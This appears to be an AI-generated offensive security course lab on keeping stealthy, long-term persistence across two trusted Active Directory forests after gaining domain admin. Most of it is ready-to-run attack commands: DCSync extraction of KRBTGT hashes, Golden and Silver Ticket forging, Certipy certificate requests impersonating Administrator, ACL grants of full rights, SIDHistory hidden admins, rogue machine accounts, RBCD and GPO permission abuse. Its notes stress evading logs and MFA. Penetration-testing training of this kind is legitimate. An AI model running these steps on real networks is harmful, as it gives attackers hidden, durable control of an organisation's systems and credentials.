### _Week 10 — Enterprise Persistence, Multi‑Forest Control & Long‑Term Access_

**Estimated Time:** 180–240 minutes  
**Difficulty:** Expert  
**Tools:** Mimikatz, Rubeus, Impacket, PowerView, BloodHound, AD CS (optional), GPO abuse tools, Golden/Silver Tickets, SIDHistory persistence, machine account persistence, ACL abuse, proxychains  
**Environment:** Multi‑forest AD environment (e.g., `corp.local` + `dev.local`) with a forest trust

---

## **1. Purpose of This Lab**

This lab teaches you how to establish **long‑term, stealthy, enterprise‑wide persistence** across **multiple forests** after achieving domain dominance.

You will learn to:

- Maintain persistence across forest boundaries
- Abuse trust relationships for long‑term access
- Install cross‑forest Kerberos backdoors
- Abuse AD CS for multi‑forest persistence
- Abuse ACLs, GPOs, and SIDHistory for stealthy control
- Create machine‑level persistence that survives resets
- Build an enterprise‑wide persistence map

This is the final persistence lab before the Week 10 capstone.

---

## **2. Pre‑Lab Requirements**

You must have:

- Completed **Labs 10.1–10.6**
- Domain Admin in **Forest A**
- Domain Admin or equivalent access in **Forest B** (or a path to it)
- Rubeus + Mimikatz uploaded
- Impacket installed
- AD CS present (optional but recommended)
- SOCKS proxy + proxychains configured

Example topology:

```
Forest A (corp.local)  ←→  Forest B (dev.local)
You control both → You want long‑term persistence
```

---

## **3. Lab Tasks**

---

# **SECTION A — CROSS‑FOREST KERBEROS PERSISTENCE**

---

# **Task 1 — Create Multi‑Forest Golden Tickets**

### **Objective**

Forge Golden Tickets for both forests.

### **Steps**

Extract KRBTGT hash in each forest:

```
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /domain:dev.local /user:krbtgt
```

Forge Golden Tickets:

```
kerberos::golden /domain:corp.local /sid:<corp-SID> /krbtgt:<hash> /user:Administrator /ptt
kerberos::golden /domain:dev.local /sid:<dev-SID> /krbtgt:<hash> /user:Administrator /ptt
```

### **What to Observe**

- Unlimited access in both forests
- No authentication logs

### **Deliverable**

Golden Tickets for both forests.

---

# **Task 2 — Create Multi‑Forest Silver Tickets**

### **Objective**

Forge service‑specific tickets for stealthy access.

### **Steps**

```
kerberos::golden /domain:dev.local /sid:<dev-SID> /service:cifs /target:dev-dc.dev.local /rc4:<machine-hash> /ptt
```

### **Deliverable**

Silver Tickets for key services in both forests.

---

---

# **SECTION B — CROSS‑FOREST AD CS PERSISTENCE**

---

# **Task 3 — Create Long‑Lived Certificates in Both Forests**

### **Objective**

Use AD CS to create persistent authentication material.

### **Steps**

```
certipy req -u <user> -p <pass> -template <template> -ca <CA> -upn Administrator
```

Convert to PFX and store offline.

### **What to Observe**

- Certificates remain valid even if passwords change
- Certificates bypass MFA
- Certificates bypass lockouts

### **Deliverable**

Long‑lived PFX certificates for both forests.

---

# **Task 4 — Abuse Cross‑Forest Enrollment Rights**

### **Objective**

Request certificates in Forest B using Forest A credentials.

### **Steps**

```
certipy req -u <user>@corp.local -p <pass> -domain dev.local -template <template>
```

### **Deliverable**

A certificate valid in the foreign forest.

---

---

# **SECTION C — ACL‑BASED PERSISTENCE ACROSS FORESTS**

---

# **Task 5 — Add Yourself to ACLs in Both Forests**

### **Objective**

Modify ACLs to maintain hidden control.

### **Steps**

PowerView:

```
Set-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity <your-user> -Rights All
Set-DomainObjectAcl -TargetIdentity "DC=dev,DC=local" -PrincipalIdentity <your-user> -Rights All
```

### **Deliverable**

ACL‑based persistence in both forests.

---

# **Task 6 — Add Hidden Admins via SIDHistory**

### **Objective**

Use SIDHistory to create stealthy admin accounts.

### **Steps**

Forge a TGT with SIDHistory:

```
kerberos::golden /user:svc_hidden /domain:corp.local /sid:<corp-SID> /sids:<DA-SID> /krbtgt:<hash> /ptt
```

### **Deliverable**

A hidden Domain Admin account.

---

---

# **SECTION D — MACHINE ACCOUNT PERSISTENCE**

---

# **Task 7 — Create Rogue Machine Accounts in Both Forests**

### **Objective**

Use machine accounts for stealthy persistence.

### **Steps**

```
python3 addcomputer.py corp.local/<user>:<pass>
python3 addcomputer.py dev.local/<user>:<pass>
```

### **Deliverable**

Rogue machine accounts in both forests.

---

# **Task 8 — Configure RBCD for Cross‑Forest Persistence**

### **Objective**

Use Resource‑Based Constrained Delegation to maintain access.

### **Steps**

```
rbcd.py -delegate-from <rogue-machine> -delegate-to <target-machine>
```

### **Deliverable**

Cross‑forest RBCD persistence.

---

---

# **SECTION E — GPO‑BASED ENTERPRISE PERSISTENCE**

---

# **Task 9 — Modify GPOs to Maintain Access**

### **Objective**

Use GPOs to push persistence across forests.

### **Examples**

- Add users to local Administrators
- Deploy scheduled tasks
- Deploy startup scripts

### **Steps**

```
Set-GPOPermissions -Name "Default Domain Policy" -PermissionLevel GpoEdit -TargetName <your-user>
```

### **Deliverable**

GPO‑based persistence.

---

---

# **SECTION F — VALIDATION & CLEANUP AWARENESS**

---

# **Task 10 — Validate Persistence Across Forests**

### **Objective**

Ensure all persistence mechanisms work.

### **Steps**

- Inject Golden Tickets
- Inject Silver Tickets
- Use certificates
- Use RBCD
- Use rogue machine accounts
- Use ACL‑based persistence

### **Deliverable**

A validation checklist.

---

# **Task 11 — Document Multi‑Forest Persistence**

### **Objective**

Create a complete persistence map.

### **Include:**

- Kerberos persistence
- AD CS persistence
- ACL persistence
- RBCD persistence
- Machine account persistence
- GPO persistence
- Cross‑forest trust abuse

### **Deliverable**

A multi‑forest persistence map in your Obsidian vault.

---

## **4. Completion Criteria**

You have completed Lab 10.7 when you can:

- Maintain persistence across multiple forests
- Abuse AD CS, Kerberos, ACLs, and delegation for long‑term access
- Establish machine‑level and trust‑level persistence
- Validate enterprise‑wide backdoors
- Document a complete multi‑forest persistence chain

---

## **5. Next Steps**

When you’re ready, say:

**“Next lab.”**

And I’ll generate **Lab 10.8 — Enterprise‑Wide Cleanup, Remediation & Hardening (Blue Team Perspective)** in the same course style.